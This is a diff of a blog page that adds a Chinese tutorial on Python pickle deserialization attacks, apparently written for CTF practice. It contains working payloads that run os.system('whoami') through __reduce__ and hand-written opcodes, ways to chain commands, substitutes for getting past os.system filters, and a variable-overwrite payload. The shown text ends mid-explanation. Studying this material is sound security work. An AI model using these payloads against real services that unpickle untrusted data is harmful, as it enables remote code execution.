@@ -1,7 +1,7 @@
 <!doctype html>
 <html class="position-relative" itemscope itemtype="https://schema.org/WebPage" lang="en"
   data-bs-theme="auto" data-palette="blue">
-  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><script src="/assets/init/bundle.min.3b798959b8578ac61d6abb1a65b90da73580a52e0cf89db4dc122bd97142a8ed.js" integrity="sha256-O3mJWbhXisYdarsaZbkNpzWApS4M&#43;J203BIr2XFCqO0=" crossorigin="anonymous"></script>
+  <head><script src="/assets/init/bundle.min.49c380b864d080421f3bf1e7befef446294cec8900de086c8f166d7e653b8b33.js" integrity="sha256-ScOAuGTQgEIfO/Hnvv70RilM7IkA3ghsjxZtfmU7izM=" crossorigin="anonymous"></script>
 <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <title>Pickle反序列化 - decimo的小窝</title>
@@ -14,10 +14,10 @@
 <meta name="keywords" content="" />
   <meta name="description" content="python这一块" />
   <meta name="twitter:card" content="summary_large_image">
-  <meta name="twitter:image" content="http://localhost:1313/images/pickle.jpg">
+  <meta name="twitter:image" content="https://decimo.top/images/pickle.jpg">
   <meta name="twitter:title" content="Pickle反序列化">
   <meta name="twitter:description" content="python这一块">
-<meta property="og:url" content="http://localhost:1313/posts/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+<meta property="og:url" content="https://decimo.top/posts/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
   <meta property="og:site_name" content="decimo的小窝">
   <meta property="og:title" content="Pickle反序列化">
   <meta property="og:description" content="python这一块">
@@ -26,21 +26,21 @@
     <meta property="article:section" content="posts">
     <meta property="article:published_time" content="2026-11-04T13:35:35+08:00">
     <meta property="article:modified_time" content="2026-11-04T13:35:35+08:00">
-    <meta property="og:image" content="http://localhost:1313/images/pickle.jpg">
+    <meta property="og:image" content="https://decimo.top/images/pickle.jpg">
 
   <meta itemprop="name" content="Pickle反序列化">
   <meta itemprop="description" content="python这一块">
   <meta itemprop="datePublished" content="2026-11-04T13:35:35+08:00">
   <meta itemprop="dateModified" content="2026-11-04T13:35:35+08:00">
-  <meta itemprop="wordCount" content="91">
-  <meta itemprop="image" content="http://localhost:1313/images/pickle.jpg">
+  <meta itemprop="wordCount" content="1079">
+  <meta itemprop="image" content="https://decimo.top/images/pickle.jpg">
   <meta itemprop="keywords" content="奇妙小知识">
   <meta property="og:image:alt" content="Pickle反序列化" />
   <meta name="twitter:image:alt" content="Pickle反序列化" />
 
-<link data-precache rel="stylesheet" href="/assets/main/bundle.min.d5aac6480a1ef020e43c97debab51daf2d7322416eaa854051c3e1c6ef2b77df.css" integrity="sha256-1arGSAoe8CDkPJfeurUdry1zIkFuqoVAUcPhxu8rd98=" crossorigin="anonymous">
+<link data-precache rel="stylesheet" href="/assets/main/bundle.min.5e43b1a2119e65d96e086e7147d978bfdbb1033637f8262ecddbd3fbaee298c1.css" integrity="sha256-XkOxohGeZdluCG5xR9l4v9uxAzY3+CYuzdvT+67imME=" crossorigin="anonymous">
 
-    <link data-precache rel="stylesheet" href="/assets/viewer/bundle.min.5778ec8e95e9d1e612441ebcf911ccb843e5cc5d9a1fc99ec90a32adbfebb3b4.css" integrity="sha256-V3jsjpXp0eYSRB68&#43;RHMuEPlzF2aH8meyQoyrb/rs7Q=" crossorigin="anonymous">
+    <link data-precache rel="stylesheet" href="/assets/viewer/bundle.min.16d2c85c4cae39a98f8cb7a977e95e554b174f91a5484c32605637156f49ca6b.css" integrity="sha256-FtLIXEyuOamPjLepd&#43;leVUsXT5GlSEwyYFY3FW9Jyms=" crossorigin="anonymous">
 
 
 <link rel="stylesheet" href="/css/custom.08e4a19bad05b5ba15254446fc9f08cb715301d98267161e4f3ae021834445f8.css" integrity="sha256-COShm60FtboVJURG/J8Iy3FTAdmCZxYeTzrgIYNERfg=" crossorigin="anonymous"><script>
@@ -74,8 +74,8 @@
 <nav class="top-app-bar shadow navbar navbar-expand-lg">
   <div class="container">
 <a class="navbar-brand d-flex align-items-center flex-grow-1 flex-xxl-grow-0 justify-content-xxl-start ms-2 ms-xxl-0 mx-auto me-xxl-2"
-    href="http://localhost:1313/">
-    <picture><img class="logo " alt="Logo" src="http://localhost:1313/images/logo.png?v=aa7d5f4fb143f00c0e5686ae2dd15c37" loading="lazy" width="1800" height="1800" />
+    href="https://decimo.top/">
+    <picture><img class="logo " alt="Logo" src="https://decimo.top/images/logo.png?v=aa7d5f4fb143f00c0e5686ae2dd15c37" loading="lazy" width="1800" height="1800" />
 </picture>
 decimo的小窝
 </a>
@@ -88,16 +88,16 @@ decimo的小窝
       <div class="offcanvas-body p-4 pt-0 p-lg-0">
         <hr class="d-lg-none">
         <ul class="navbar-nav flex-row flex-wrap align-items-center me-auto"><li class="nav-item col-6 col-lg-auto">
-            <a class="nav-link py-2 px-0 px-lg-2" href="http://localhost:1313/posts/">Posts
+            <a class="nav-link py-2 px-0 px-lg-2" href="https://decimo.top/posts/">Posts
             </a>
           </li><li class="nav-item col-6 col-lg-auto">
-            <a class="nav-link py-2 px-0 px-lg-2" href="http://localhost:1313/categories/">Categories
+            <a class="nav-link py-2 px-0 px-lg-2" href="https://decimo.top/categories/">Categories
             </a>
           </li><li class="nav-item col-6 col-lg-auto">
-            <a class="nav-link py-2 px-0 px-lg-2" href="http://localhost:1313/archives/">Archive
+            <a class="nav-link py-2 px-0 px-lg-2" href="https://decimo.top/archives/">Archive
             </a>
           </li><li class="nav-item col-6 col-lg-auto">
-            <a class="nav-link py-2 px-0 px-lg-2" href="http://localhost:1313/friends/">Friends
+            <a class="nav-link py-2 px-0 px-lg-2" href="https://decimo.top/friends/">Friends
             </a>
           </li>
         </ul>
@@ -249,7 +249,7 @@ decimo的小窝
 
 </header>
 
-    <main class="container has-sidebar" data-kind="page"><script data-precache src="/js/main-init.a9427f53469a98d1f41056ab9e1e085a005990992fc0f97bbf459f35ed9d1d43.js" integrity="sha256-qUJ/U0aamNH0EFarnh4IWgBZkJkvwPl7v0WfNe2dHUM=" crossorigin="anonymous"></script>
+    <main class="container has-sidebar" data-kind="page"><script data-precache src="/js/main-init.1bd71a046b6885a4fee75735eaf6540987ff0fa9d2a618d9b6f57586ffce5a10.js" integrity="sha256-G9caBGtohaT&#43;51c16vZUCYf/D6nSphjZtvV1hv/OWhA=" crossorigin="anonymous"></script>
 
       <div class="row content"><noscript>
     <div class="alert alert-danger" role="alert">Your browser does not support JavaScript.</div>
@@ -294,7 +294,7 @@ decimo的小窝
     <h1 class="card-title post-title my-2">Pickle反序列化</h1>
   </div>
   <div class="card-body"><div class="post-meta mb-3">
-  <span class="post-date me-1 mb-1" title="created on 2026-11-04 13:35:35 &#43;0800 CST.">November 4, 2026</span><span class="post-reading-time me-1 mb-1">1 min read</span><a href="/categories/%E5%A5%87%E5%A6%99%E5%B0%8F%E7%9F%A5%E8%AF%86/" class="btn btn-sm btn-secondary mb-1 me-2 py-0 pe-1 post-taxonomy post-taxonomy-sm post-category">
+  <span class="post-date me-1 mb-1" title="created on 2026-11-04 13:35:35 &#43;0800 CST.">November 4, 2026</span><span class="post-reading-time me-1 mb-1">11 min read</span><a href="/categories/%E5%A5%87%E5%A6%99%E5%B0%8F%E7%9F%A5%E8%AF%86/" class="btn btn-sm btn-secondary mb-1 me-2 py-0 pe-1 post-taxonomy post-taxonomy-sm post-category">
       <i class="fas fa-fw fa-folder me-1"></i>奇妙小知识</a>
 </div>
 
@@ -325,14 +325,14 @@ decimo的小窝
 <li>设置对象属性</li>
 <li>结束</li>
 </ul>
-<p>它不想 JSON 那样只是描述数据，而是包含了执行构造动作的指令流。</p>
+<p>它不像 JSON 那样只是描述数据，而是包含了执行构造动作的指令流。</p>
 <p>pickle 反序列化时可以执行 <code>GLOBAL</code>、<code>REDUCE</code>、<code>BUILD</code> 等 opcode，攻击者可以手工构造字节流，让反序列化过程去导入并调用某些函数，或者构造/修改对象状态。经典攻击效果就是：<strong>反序列化不可信 pickle 就约等于RCE</strong>。</p>
 <p>当然执行什么还取决于目标环境有哪些模块和函数可用。</p>
 <p>正是因此，手写 opcode 会比用 pickle 序列化生成的代码更加灵活。</p>
 <p>比如说，正常 <code>pickle.dumps</code> 一个字符串，一般不会生成导入 <code>os</code> 并调用 <code>system</code>这种指令；但手工拼 pickle 字节流可以包含这类 opcode 组合。</p>
 
 <h3 id="object__reduce__-函数" data-numberify>object.__reduce__() 函数<a class="anchor ms-1" href="#object__reduce__-函数"></a></h3>
-<p><code>__reduce__()</code> 函数在对象被 pickle 序列化时被 <code>pickle.dumps()</code> 调用。它返回一个元组，告诉 pickle：“反序列化时请这样重建我”。</p>
+<p><code>__reduce__()</code> 函数在对象被 pickle 序列化时被 <code>pickle.dumps()</code> 调用。它返回一个<strong>元组</strong>，告诉 pickle：“反序列化时请这样重建我”。</p>
 <p>比如：</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln">1</span><span class="cl"><span class="kn">import</span> <span class="nn">pickle</span>
 </span></span><span class="line"><span class="ln">2</span><span class="cl">
@@ -345,6 +345,390 @@ decimo的小窝
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln">1</span><span class="cl"><span class="p">(</span><span class="nb">print</span><span class="p">,</span> <span class="p">(</span><span class="s2">&#34;hello&#34;</span><span class="p">,))</span>
 </span></span></code></pre></div>
 <h4 id="__reduce__-的返回值结构" data-numberify>__reduce__() 的返回值结构<a class="anchor ms-1" href="#__reduce__-的返回值结构"></a></h4>
+<p><code>__reduce__()</code> 的返回值可以是一个 2 到 6 元的元组（Python 3.8+ 支持第6个元素），最常见的是 2 元组：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln">1</span><span class="cl"><span class="p">(</span><span class="n">callable</span><span class="p">,</span> <span class="n">args</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="c1"># 或</span>
+</span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="p">(</span><span class="n">callable</span><span class="p">,</span> <span class="n">args</span><span class="p">,</span> <span class="n">state</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="c1"># 或</span>
+</span></span><span class="line"><span class="ln">5</span><span class="cl"><span class="p">(</span><span class="n">callable</span><span class="p">,</span> <span class="n">args</span><span class="p">,</span> <span class="n">state</span><span class="p">,</span> <span class="n">listitems</span><span class="p">,</span> <span class="n">dictitems</span><span class="p">)</span>
+</span></span></code></pre></div><ul>
+<li><strong>第一个元素</strong>：一个可调用对象（函数、类等），反序列化时会调用它</li>
+<li><strong>第二个元素</strong>：调用时传入的参数元组</li>
+<li><strong>第三个元素</strong>（可选）：对象的状态，会通过 <code>__setstate__()</code> 或 <code>__dict__</code> 更新应用到对象上</li>
+<li><strong>第四、五个元素</strong>（可选）：用于 list/dict 子类的迭代器</li>
+</ul>
+<p>关键点在于：<strong>第一个元素可以是任意可调用对象</strong>。pickle 反序列化时，会去导入这个可调用对象并执行 <code>callable(*args)</code>。如果攻击者能控制 <code>__reduce__()</code> 的返回值，就等同于控制了反序列化时要执行的函数和参数。</p>
+<blockquote>
+<p>注意：<code>__reduce__()</code> 的返回值是在<strong>序列化时</strong>构造的，所以里面写的 <code>getattr(x, &quot;y&quot;)</code> 是在 <code>pickle.dumps</code> 那一刻就求值了；反序列化时 <code>REDUCE</code> 只是调用第一个元素。</p>
+</blockquote>
+
+<h3 id="构造恶意-pickle" data-numberify>构造恶意 pickle<a class="anchor ms-1" href="#构造恶意-pickle"></a></h3>
+<p>理解了 <code>__reduce__()</code> 之后，构造恶意 pickle 就很简单了——我们不需要真的有一个类，可以直接用 <code>pickle.dumps</code> 生成，也可以手工构造。最经典的就是：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln">1</span><span class="cl"><span class="kn">import</span> <span class="nn">pickle</span>
+</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="ln">3</span><span class="cl">
+</span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="k">class</span> <span class="nc">Evil</span><span class="p">:</span>
+</span></span><span class="line"><span class="ln">5</span><span class="cl">    <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+</span></span><span class="line"><span class="ln">6</span><span class="cl">        <span class="k">return</span> <span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">,</span> <span class="p">(</span><span class="s2">&#34;whoami&#34;</span><span class="p">,))</span>
+</span></span><span class="line"><span class="ln">7</span><span class="cl">
+</span></span><span class="line"><span class="ln">8</span><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">Evil</span><span class="p">())</span>
+</span></span></code></pre></div><p>反序列化这段字节流时，pickle 会：</p>
+<ol>
+<li>通过 <code>GLOBAL</code> opcode 导入 <code>os.system</code></li>
+<li>通过 <code>REDUCE</code> opcode 调用 <code>os.system(&quot;whoami&quot;)</code></li>
+<li>执行系统命令</li>
+</ol>
+<p>等价的手写 opcode 大概是：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln">1</span><span class="cl"><span class="sa">b</span><span class="s2">&#34;cos</span><span class="se">\n</span><span class="s2">system</span><span class="se">\n</span><span class="s2">(S&#39;whoami&#39;</span><span class="se">\n</span><span class="s2">tR.&#34;</span>
+</span></span></code></pre></div><p>用 <code>pickletools.dis()</code> 反汇编一下更清楚：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln">1</span><span class="cl"><span class="kn">import</span> <span class="nn">pickletools</span>
+</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="n">pickletools</span><span class="o">.</span><span class="n">dis</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;cos</span><span class="se">\n</span><span class="s2">system</span><span class="se">\n</span><span class="s2">(S&#39;whoami&#39;</span><span class="se">\n</span><span class="s2">tR.&#34;</span><span class="p">)</span>
+</span></span></code></pre></div><p>输出大致是：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">    0: c    GLOBAL     &#39;os system&#39;
+</span></span><span class="line"><span class="ln">2</span><span class="cl">   11: (    MARK
+</span></span><span class="line"><span class="ln">3</span><span class="cl">   12: S        STRING     &#39;whoami&#39;
+</span></span><span class="line"><span class="ln">4</span><span class="cl">   22: t        TUPLE      (MARK at 11)
+</span></span><span class="line"><span class="ln">5</span><span class="cl">   23: R    REDUCE
+</span></span><span class="line"><span class="ln">6</span><span class="cl">   24: .    STOP
+</span></span></code></pre></div><p><code>GLOBAL</code> 压入 <code>os.system</code>，<code>STRING</code> 压入 <code>&quot;whoami&quot;</code>，<code>TUPLE</code> 把参数打包成元组，<code>REDUCE</code> 执行调用，<code>STOP</code> 结束。整个过程就是一个栈式虚拟机的执行流。</p>
+
+<h3 id="pvm栈memo-与-opcode-速查" data-numberify>PVM：栈、memo 与 opcode 速查<a class="anchor ms-1" href="#pvm栈memo-与-opcode-速查"></a></h3>
+<p>前面说 pickle 反序列化器是“栈式虚拟机”，具体来说它由三部分组成：</p>
+<ul>
+<li><strong>解析引擎</strong>：逐条读 opcode 并执行，遇到 <code>.</code>（STOP）停止</li>
+<li><strong>栈</strong>：Python list，临时存放数据和参数，反序列化结束时栈顶就是 <code>pickle.loads()</code> 的返回值</li>
+<li><strong>memo</strong>：Python dict，用 <code>p</code>（PUT，存）和 <code>g</code>（GET，取）两个 opcode 操作，让同一个对象在字节流里只构造一次、多次复用</li>
+</ul>
+<p>理解了栈和 memo，手写 opcode 就是“想象栈上有什么，然后选对应的 opcode”。v0 协议常用 opcode 如下（手写一般用 v0，因为可读性最好）：</p>
+<table>
+  <thead>
+      <tr>
+          <th>opcode</th>
+          <th>名称</th>
+          <th>作用</th>
+          <th>栈变化</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><code>c</code></td>
+          <td>GLOBAL</td>
+          <td>导入 <code>module.name</code> 并入栈，<strong>会触发 <code>find_class()</code></strong></td>
+          <td>对象入栈</td>
+      </tr>
+      <tr>
+          <td><code>S</code></td>
+          <td>STRING</td>
+          <td>压入字符串</td>
+          <td>字符串入栈</td>
+      </tr>
+      <tr>
+          <td><code>V</code></td>
+          <td>UNICODE</td>
+          <td>压入 unicode 字符串</td>
+          <td>字符串入栈</td>
+      </tr>
+      <tr>
+          <td><code>I</code></td>
+          <td>INTEGER</td>
+          <td>压入整数</td>
+          <td>整数入栈</td>
+      </tr>
+      <tr>
+          <td><code>F</code></td>
+          <td>FLOAT</td>
+          <td>压入浮点数</td>
+          <td>浮点数入栈</td>
+      </tr>
+      <tr>
+          <td><code>N</code></td>
+          <td>NONE</td>
+          <td>压入 <code>None</code></td>
+          <td><code>None</code> 入栈</td>
+      </tr>
+      <tr>
+          <td><code>(</code></td>
+          <td>MARK</td>
+          <td>压入标记，供 <code>t</code>/<code>d</code>/<code>l</code> 组合用</td>
+          <td>MARK 入栈</td>
+      </tr>
+      <tr>
+          <td><code>t</code></td>
+          <td>TUPLE</td>
+          <td>MARK 到栈顶组成元组</td>
+          <td>元组入栈</td>
+      </tr>
+      <tr>
+          <td><code>)</code></td>
+          <td>EMPTY_TUPLE</td>
+          <td>压入空元组</td>
+          <td>空元组入栈</td>
+      </tr>
+      <tr>
+          <td><code>l</code></td>
+          <td>LIST</td>
+          <td>MARK 到栈顶组成列表</td>
+          <td>列表入栈</td>
+      </tr>
+      <tr>
+          <td><code>]</code></td>
+          <td>EMPTY_LIST</td>
+          <td>压入空列表</td>
+          <td>空列表入栈</td>
+      </tr>
+      <tr>
+          <td><code>d</code></td>
+          <td>DICT</td>
+          <td>MARK 到栈顶组成字典（偶数个元素）</td>
+          <td>字典入栈</td>
+      </tr>
+      <tr>
+          <td><code>}</code></td>
+          <td>EMPTY_DICT</td>
+          <td>压入空字典</td>
+          <td>空字典入栈</td>
+      </tr>
+      <tr>
+          <td><code>R</code></td>
+          <td>REDUCE</td>
+          <td>调 <code>TOS1(*TOS)</code>，对应 <code>__reduce__</code>。即弹出栈顶的参数元组和次栈顶的 callable，执行 <code>callable(*args)</code></td>
+          <td>返回值入栈</td>
+      </tr>
+      <tr>
+          <td><code>b</code></td>
+          <td>BUILD</td>
+          <td>用 TOS 作为 state 设置 TOS1（触发 <code>__setstate__</code> 或更新 <code>__dict__</code>）</td>
+          <td>两元素出栈</td>
+      </tr>
+      <tr>
+          <td><code>s</code></td>
+          <td>SETITEM</td>
+          <td><code>TOS2[TOS1] = TOS</code></td>
+          <td>三元素出栈</td>
+      </tr>
+      <tr>
+          <td><code>a</code></td>
+          <td>APPEND</td>
+          <td><code>TOS1.append(TOS)</code></td>
+          <td>两元素出栈</td>
+      </tr>
+      <tr>
+          <td><code>e</code></td>
+          <td>APPENDS</td>
+          <td>MARK 到栈顶的元素 extend 到 TOS</td>
+          <td>—</td>
+      </tr>
+      <tr>
+          <td><code>u</code></td>
+          <td>SETITEMS</td>
+          <td>MARK 到栈顶的 key-value 对更新到 TOS</td>
+          <td>—</td>
+      </tr>
+      <tr>
+          <td><code>o</code></td>
+          <td>OBJ</td>
+          <td>找 MARK，以之间第一个元素为 callable，其余为参数，调用</td>
+          <td>返回值入栈</td>
+      </tr>
+      <tr>
+          <td><code>i</code></td>
+          <td>INST</td>
+          <td>先 <code>GLOBAL</code> 拿 callable，再找 MARK 组合参数并调用</td>
+          <td>返回值入栈</td>
+      </tr>
+      <tr>
+          <td><code>p</code> / <code>g</code></td>
+          <td>PUT / GET</td>
+          <td>存/取 memo</td>
+          <td>—</td>
+      </tr>
+      <tr>
+          <td><code>0</code></td>
+          <td>POP</td>
+          <td>丢弃栈顶</td>
+          <td>—</td>
+      </tr>
+      <tr>
+          <td><code>.</code></td>
+          <td>STOP</td>
+          <td>结束，栈顶作为返回值</td>
+          <td>—</td>
+      </tr>
+  </tbody>
+</table>
+<p>完整表见 <code>pickle.py</code> 源码。有了这张表，回头看 <code>b&quot;cos\nsystem\n(S'whoami'\ntR.&quot;</code> 就一目了然：<code>c</code> 压 <code>os.system</code> → <code>(</code> 开 MARK → <code>S</code> 压参数 → <code>t</code> 打包成元组 → <code>R</code> 调用 → <code>.</code> 结束。</p>
+
+<h3 id="手写-opcode从单函数到多指令" data-numberify>手写 opcode：从单函数到多指令<a class="anchor ms-1" href="#手写-opcode从单函数到多指令"></a></h3>
+<p><code>__reduce__</code> 的局限是<strong>一次只能调一个函数</strong>。实战里经常要一次执行多条命令、或先覆盖变量再执行函数，这时候就需要手写 opcode。</p>
+<p>同一个 <code>os.system(&quot;whoami&quot;)</code>，有三种等价写法（<code>R</code> / <code>i</code> / <code>o</code>），都值得会：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln">1</span><span class="cl"><span class="c1"># R 写法（最常见）</span>
+</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="sa">b</span><span class="s2">&#34;cos</span><span class="se">\n</span><span class="s2">system</span><span class="se">\n</span><span class="s2">(S&#39;whoami&#39;</span><span class="se">\n</span><span class="s2">tR.&#34;</span>
+</span></span><span class="line"><span class="ln">3</span><span class="cl">
+</span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="c1"># i 写法：先 MARK，参数入栈，i 再导入 callable 并调用</span>
+</span></span><span class="line"><span class="ln">5</span><span class="cl"><span class="sa">b</span><span class="s2">&#34;(S&#39;whoami&#39;</span><span class="se">\n</span><span class="s2">ios</span><span class="se">\n</span><span class="s2">system</span><span class="se">\n</span><span class="s2">.&#34;</span>
+</span></span><span class="line"><span class="ln">6</span><span class="cl">
+</span></span><span class="line"><span class="ln">7</span><span class="cl"><span class="c1"># o 写法：先 MARK，callable 入栈，参数入栈，o 调用</span>
+</span></span><span class="line"><span class="ln">8</span><span class="cl"><span class="sa">b</span><span class="s2">&#34;(cos</span><span class="se">\n</span><span class="s2">system</span><span class="se">\n</span><span class="s2">S&#39;whoami&#39;</span><span class="se">\n</span><span class="s2">o.&#34;</span>
+</span></span></code></pre></div><p><code>i</code> 和 <code>o</code> 的区别在于：<code>i</code> 是“先参数后 callable”，<code>o</code> 是“先 callable 后参数”，两者都靠 MARK 界定参数边界。</p>
+<p><strong>拼接多条指令</strong>：pickle 流之间可以直接拼接——去掉第一个流的结尾 <code>.</code>，把第二个流接上去，保留第二个流的 <code>.</code> 即可：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln">1</span><span class="cl"><span class="sa">b</span><span class="s2">&#34;cos</span><span class="se">\n</span><span class="s2">system</span><span class="se">\n</span><span class="s2">(S&#39;whoami&#39;</span><span class="se">\n</span><span class="s2">tR&#34;</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;cos</span><span class="se">\n</span><span class="s2">system</span><span class="se">\n</span><span class="s2">(S&#39;id&#39;</span><span class="se">\n</span><span class="s2">tR.&#34;</span>
+</span></span></code></pre></div><p>反序列化时会先执行 <code>whoami</code>，再执行 <code>id</code>。这是 <code>__reduce__</code> 做不到的，也是手写 opcode 灵活性的直接体现。</p>
+
+<h3 id="不仅仅是-ossystem" data-numberify>不仅仅是 os.system<a class="anchor ms-1" href="#不仅仅是-ossystem"></a></h3>
+<p>实际比赛中，<code>os.system</code> 往往是被过滤的重点，常见的替代思路有：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="c1"># subprocess</span>
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="p">(</span><span class="n">subprocess</span><span class="o">.</span><span class="n">check_output</span><span class="p">,</span> <span class="p">([</span><span class="s2">&#34;whoami&#34;</span><span class="p">],))</span>
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="c1"># eval / exec</span>
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="p">(</span><span class="nb">eval</span><span class="p">,</span> <span class="p">(</span><span class="s2">&#34;__import__(&#39;os&#39;).system(&#39;whoami&#39;)&#34;</span><span class="p">,))</span>
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="p">(</span><span class="n">exec</span><span class="p">,</span> <span class="p">(</span><span class="s2">&#34;import os; os.system(&#39;whoami&#39;)&#34;</span><span class="p">,))</span>
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="c1"># 通过 builtins</span>
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="p">(</span><span class="nb">__import__</span><span class="p">(</span><span class="s1">&#39;builtins&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">eval</span><span class="p">,</span> <span class="p">(</span><span class="s2">&#34;1+1&#34;</span><span class="p">,))</span>
+</span></span><span class="line"><span class="ln">10</span><span class="cl">
+</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="c1"># 通过 os.popen</span>
+</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">,</span> <span class="p">(</span><span class="s2">&#34;whoami&#34;</span><span class="p">,))</span>
+</span></span><span class="line"><span class="ln">13</span><span class="cl">
+</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="c1"># 通过 platform</span>
+</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="p">(</span><span class="n">platform</span><span class="o">.</span><span class="n">popen</span><span class="p">,</span> <span class="p">(</span><span class="s2">&#34;whoami&#34;</span><span class="p">,))</span>
+</span></span></code></pre></div><p><strong><code>getattr</code> 的正确用法</strong>需要特别注意：<code>__reduce__</code> 的第一个元素是<strong>被调用</strong>的，不是被求值的。所以：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln">1</span><span class="cl"><span class="p">(</span><span class="nb">getattr</span><span class="p">,</span> <span class="p">(</span><span class="n">os</span><span class="p">,</span> <span class="s2">&#34;system&#34;</span><span class="p">))</span>                  <span class="c1"># ❌ 只拿到 os.system 函数对象，不会执行</span>
+</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="p">(</span><span class="nb">getattr</span><span class="p">(</span><span class="n">os</span><span class="p">,</span> <span class="s2">&#34;system&#34;</span><span class="p">),</span> <span class="p">(</span><span class="s2">&#34;whoami&#34;</span><span class="p">,))</span>       <span class="c1"># ✅ 先求值拿到函数，再让 REDUCE 调用它</span>
+</span></span></code></pre></div><p>更隐蔽的还可以用 <code>map</code>、<code>functools.reduce</code> 等做链式调用。本质上只要能在目标环境里找到一个可调用 + 能执行命令/代码的组合，就能打出 RCE。</p>
+
+<h3 id="变量覆盖" data-numberify>变量覆盖<a class="anchor ms-1" href="#变量覆盖"></a></h3>
+<p>pickle 除了 RCE，还有另一条非常常见的利用路径：<strong>变量覆盖</strong>。不需要执行任何命令，改掉目标程序里的某个变量就能绕过验证、拿到 flag。</p>
+<p>假设目标程序：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="c1"># secret.py</span>
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="n">name</span> <span class="o">=</span> <span class="s1">&#39;leyi&#39;</span>
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="c1"># main.py</span>
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="kn">import</span> <span class="nn">pickle</span>
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="kn">import</span> <span class="nn">secret</span>
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="n">opcode</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;c__main__</span><span class="se">\n</span><span class="s2">secret</span><span class="se">\n</span><span class="s2">(S&#39;name&#39;</span><span class="se">\n</span><span class="s2">S&#39;btop251&#39;</span><span class="se">\n</span><span class="s2">db.&#34;</span>
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="n">pickle</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">opcode</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">secret</span><span class="o">.</span><span class="n">name</span><span class="p">)</span>   <span class="c1"># 输出 btop251</span>
+</span></span></code></pre></div><p>payload 拆解：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">c__main__\nsecret\n   # GLOBAL：拿到 __main__.secret 模块对象
+</span></span><span class="line"><span class="ln">2</span><span class="cl">(                     # MARK
+</span></span><span class="line"><span class="ln">3</span><span class="cl">S&#39;name&#39;               # 压 key
+</span></span><span class="line"><span class="ln">4</span><span class="cl">S&#39;btop251&#39;            # 压 value
+</span></span><span class="line"><span class="ln">5</span><span class="cl">d                     # DICT：组合成 {&#39;name&#39;: &#39;btop251&#39;}
+</span></span><span class="line"><span class="ln">6</span><span class="cl">b                     # BUILD：对 secret 模块对象做属性更新
